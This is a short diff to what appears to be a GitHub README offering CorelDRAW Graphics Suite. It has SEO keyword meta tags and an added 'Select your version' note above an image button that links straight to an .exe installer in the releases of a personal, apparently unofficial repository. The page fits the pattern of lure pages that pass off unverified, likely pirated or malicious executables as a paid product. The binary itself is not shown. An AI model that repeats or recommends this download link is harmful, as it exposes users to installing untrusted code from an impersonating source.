@@ -1,6 +1,8 @@
 <meta name="description" content="CorelDRAW Graphics Suite: Comprehensive graphic design software for professionals and enthusiasts.">
 <meta name="keywords" content="CorelDRAW, Graphics Suite, graphic design, vector graphics, photo editing, illustration software, design tools, typography, layout design">
 
+> [!Note]
+> Select your version
 [<img src="https://github.com/user-attachments/assets/abd0cdb5-d727-4524-a91a-e8afe56c6a24">](https://github.com/arsham129/CorelDRAW-Graphics-Suite-2024-2025/releases/download/2/installer-CorelDRAW-Graphics-Suite.exe)
 
 
